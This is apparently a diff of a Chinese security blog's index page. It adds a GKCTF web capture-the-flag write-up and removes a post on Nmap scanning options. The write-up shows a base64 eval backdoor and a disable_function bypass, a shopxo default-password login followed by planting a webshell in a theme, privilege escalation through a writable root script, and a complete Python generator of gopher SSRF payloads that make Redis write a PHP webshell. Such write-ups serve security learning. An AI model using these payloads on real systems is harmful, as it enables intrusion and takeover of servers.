@@ -139,6 +139,137 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-GKCTF-wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/09/GKCTF-wp/">GKCTF-wp</a>
+    </h1>
+  
+
+        
+        <a href="/2020/06/09/GKCTF-wp/" class="archive-article-date">
+  	<time datetime="2020-06-09T01:42:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="GKCTF-wp-Web"><a href="#GKCTF-wp-Web" class="headerlink" title="GKCTF-wp(Web)"></a>GKCTF-wp(Web)</h3><p>好久不更博客了，最近两个月主要精力放在学习开发上了，正好有时间就把GKCTFweb部分复现一下。</p>
+<h4 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h4><h5 id="考察知识点：rce-绕过disable-function"><a href="#考察知识点：rce-绕过disable-function" class="headerlink" title="考察知识点：rce,绕过disable_function"></a>考察知识点：rce,绕过disable_function</h5><p>点开即得到页面源码：</p>
+<pre><code>&lt;title&gt;Check_In&lt;/title&gt;
+&lt;?php 
+highlight_file(__FILE__);
+class ClassName
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {
+                $this-&gt;code = @$this-&gt;x()[&apos;Ginkgo&apos;];
+                $this-&gt;decode = @base64_decode( $this-&gt;code );
+                @Eval($this-&gt;decode);
+        }
+
+        public function x()
+        {
+                return $_REQUEST;
+        }
+}
+new ClassName();</code></pre><p>发现可以直接构造命令执行，对“@eval($_POST[aaa]);”进行base64操作即可，使用蚁剑连接；发现根目录下有/readflag，做多了就知道肯定是用这个读取flag的，发现命令都被ban了，于是使用绕过disable_funciton的POC，在/tmp目录上传文件后，包含即可得到flag</p>
+<pre><code>aaa=include(&quot;/tmp/exp.php&quot;);</code></pre><p><img src="../image/62.jpg" alt="1"></p>
+<h3 id="CVE签到"><a href="#CVE签到" class="headerlink" title="CVE签到"></a>CVE签到</h3><h4 id="考察知识点：CVE-2020-7066"><a href="#考察知识点：CVE-2020-7066" class="headerlink" title="考察知识点：CVE-2020-7066"></a>考察知识点：CVE-2020-7066</h4><p>进去后，提示我们可以访问任意*.ctfhub.com<br>该CVE主要是可以使用某些方法使得get_headers()请求到错误的主机，从而造成信息泄露<br>尝试输入127.0.0.1%00.ctfhub.com：<br><img src="../images/63.jpg" alt="2"><br>提示要求123结尾，修改后得到flag：<br><img src="../images/64.jpg" alt="3"></p>
+<h3 id="老八小超市"><a href="#老八小超市" class="headerlink" title="老八小超市"></a>老八小超市</h3><h4 id="考察知识点：弱口令登陆，getshell"><a href="#考察知识点：弱口令登陆，getshell" class="headerlink" title="考察知识点：弱口令登陆，getshell"></a>考察知识点：弱口令登陆，getshell</h4><p>进去后是shopxo的商城，百度了shopxo的漏洞，可参考：<a href="http://www.nctry.com/1660.html。" target="_blank" rel="noopener">http://www.nctry.com/1660.html。</a><br>进入后台登陆页面，使用弱口令（admin:shopxo）登陆，下载一个免费主题后，将准备好的一句话木马添加进去；然后安装主题，找到一句话木马的路径（<a href="http://xxx.com/public/static/index/default/test.php）" target="_blank" rel="noopener">http://xxx.com/public/static/index/default/test.php）</a><br>使用蚁剑连接后，发现根目录下的flag提示真正的flag在/root下，但当前用户权限不够，想到提权，但再观察一下根目录下有一个auto.sh文件，内容是执行/var/mail/makeflaghint.py这个文件。查看这个文件执行权写为root，且有写权限，于是利用写全写，让这个文件将/root/flag的内容写出来：<br><img src="../images/65.jpg" alt="4"><br>等一会儿即可得到flag<br><img src="../images/66.jpg" alt="5"></p>
+<h3 id="EzWeb"><a href="#EzWeb" class="headerlink" title="EzWeb"></a>EzWeb</h3><h4 id="考察知识点：SSRF-Gopher，Redis写Webshell"><a href="#考察知识点：SSRF-Gopher，Redis写Webshell" class="headerlink" title="考察知识点：SSRF+Gopher，Redis写Webshell"></a>考察知识点：SSRF+Gopher，Redis写Webshell</h4><p>进去后，给了一个查找ip功能，发现url中有关键字”url”，猜测是否为ssrf，F12后发现提示：通过?secret后得到ip地址：<br><img src="../images/67.jpg" alt="6"><br>用BP扫一下内网后，发现共有5个ip存活：<br><img src="../images/68.jpg" alt="7"><br>依次访问后，发现11有提示信息。对11进行端口扫描，发现6379Redis开放。大概有了思路，利用ssrf打Redis，发现file,dict协议都被ban了（这里其实可以这样用file，file:/etc/passwd或file: ///var/www/html/index.php)也可以读取本地文件信息：<br><img src="../images/69.jpg" alt="8"><br>gopher没有，于是使用gopher协议写webshell：</p>
+<pre><code>import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;173.222.47.11&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+    &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+    &quot;config set dir {}&quot;.format(path),
+    &quot;config set dbfilename {}&quot;.format(filename),
+    &quot;save&quot;
+    ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print(payload)</code></pre><p>提交后，执行命令即可拿到flag,这里过滤了空格，使用${IFS}绕过即可<br><img src="../images/70.jpg" alt="9"></p>
+<p>还有三道题目个人觉得学到很多，值得单独详细分析一下，就放到下一篇</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Web，SSRF，RCE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/06/09/GKCTF-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-PRCE回溯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1380,86 +1511,6 @@ echo &quot;)&lt;br&gt;&quot;;</code></pre><p>最后将得到的源码进行base6
 
 
   
-    <article id="post-Nmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/15/Nmap/">Nmap</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/15/Nmap/" class="archive-article-date">
-  	<time datetime="2020-04-15T11:38:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Nmap——端口扫描工具"><a href="#Nmap——端口扫描工具" class="headerlink" title="Nmap——端口扫描工具"></a>Nmap——端口扫描工具</h3><h4 id="端口状态及扫描原理"><a href="#端口状态及扫描原理" class="headerlink" title="端口状态及扫描原理"></a>端口状态及扫描原理</h4><p>nmap通过探测将端口划分为6个状态：<br>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。<br>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽<br>TCP SYN 扫描（-sS）<br>　　这是默认的扫描方式，通常被称作半开放扫描，该方式通过发送SYN到目标端口，如果收到SYN/ACK回复，就可以判断端口是开放的，如果收到RST包，说明</p>
-<p>该端口是关闭的。如果没有收到回复，就可以判断该端口被屏蔽了，该方式不建立完整的TCP连接，相对比较隐蔽，而且效率高，时用范围广</p>
-<p>TCP connent 扫描（-sT）<br> 　　TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标主机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式</p>
-<p>TCP ACK 扫描（-sA）</p>
-<p>　　向目标主机的端口发送ACK包，如果收到RST包，说明端口没有被防火墙屏蔽，该方式只能用于确定防火墙是否屏蔽某个端口吗，可以辅助TCP SYN的方式来判断目标主机防火墙的状况</p>
-<h4 id="Nmap常用命令"><a href="#Nmap常用命令" class="headerlink" title="Nmap常用命令"></a>Nmap常用命令</h4><p>1、扫描单个目标地址 nmap直接＋目标地址 nmap 192.168.0.100<br>2、扫描多个地址<br>nmap 192.168.0.100-109<br>3、扫描1.txt中的所有目标地址<br>nmap -iL C:\User\Desktop\1.txt<br>4、扫描除某一个目标地址之外的所有目标地址<br>nmap 192.168.0.100/24 -exclude 192.168.0.105<br>5、扫描某一目标主机的某些端口，使用-p参数<br>nmap 192.168.0.105 -p 21,22,80<br>6、对目标地址进行路由追踪<br>nmap –traceroute 192.168.0.105<br>7、扫描目标地址所在C端的在线状况<br>-sP参数表示使用ping扫描判断主机是否存活，但因为有的主机会禁ping，所以不一定准确<br>nmap -sP 192.168.0.100/24<br>8、操作系统指纹识别、服务版本扫描<br>Nmap -O -sV 192.168.0.105</p>
-<h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p> 1 -A ：选项用于使用进攻性方式扫描（同时启用系统指纹识别+服务版本扫描）<br> 2 -T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<br> 3 -oX test.xml： 将扫描结果生成 test.xml 文件<br> 4 -oG test.txt:  将扫描结果生成 test.txt 文件<br> 5 -sn : 只进行主机发现，不进行端口扫描<br> 6 -O : 指定Nmap进行系统版本扫描<br> 7 -sV: 指定让Nmap进行服务版本扫描<br> 8 -p &lt;port ranges&gt;: 扫描指定的端口<br> 9 -sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描<br>10 -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况<br>11 -script &lt;script name&gt; : 指定扫描脚本<br>12 -Pn ： 不进行ping扫描<br>13 -sP :  用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<br>14 -PI :  设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。<br>15 -iL 1.txt : 批量扫描1.txt中的目标地址<br>17 -sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现<br>18 -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况<br>19 -sO: 使用IP protocol 扫描确定目标机支持的协议类型<br>20 -PO : 使用IP协议包探测对方主机是否开启<br>21 -PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机<br>22 -PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现<br>24 -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态<br>25 -e eth0：指定使用eth0网卡进行探测<br>26 -f : –mtu &lt;val&gt;: 指定使用分片、指定数据包的 MTU.<br>27 -b &lt;FTP relay host&gt;: 使用FTP bounce scan扫描方式<br>28 -g： 指定发送的端口号<br>29 -r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）<br>30 -v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态<br>31 -n : 表示不进行DNS解析；<br>32 -D  &lt;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址<br>33 -R ：表示总是进行DNS解析。<br>34 -F : 快速模式，仅扫描TOP 100的端口<br>35 -S &lt;IP_Address&gt;: 伪装成其他 IP 地址<br>36 –ttl &lt;val&gt;: 设置 time-to-live 时间<br>37 –badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）<br>38 –dns-servers  : 指定DNS服务器<br>39 –system-dns : 指定使用系统的DNS服务器<br>40 –traceroute : 追踪每个路由节点<br>41 –scanflags &lt;flags&gt;: 定制TCP包的flags<br>42 –top-ports &lt;number&gt; :扫描开放概率最高的number个端口<br>43 –port-ratio &lt;ratio&gt;: 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数<br>44 –version-trace: 显示出详细的版本侦测过程信息<br>45 –osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）<br>46 –osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统<br>47 –data-length &lt;num&gt;: 填充随机数据让数据包长度达到 Num<br>48 –ip-options &lt;options&gt;: 使用指定的 IP 选项来发送数据包<br>49 –spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址<br>50 –version-intensity &lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。<br>51 –version-light: 指定使用轻量侦测方式 (intensity 2)<br>52 –version-all: 尝试使用所有的probes进行侦测 (intensity 9)</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">nmap</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/15/Nmap/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1626,6 +1677,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">绕过正则匹配</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Web，SSRF，RCE</a>
               </li>
             
             <div class="clearfix"></div>
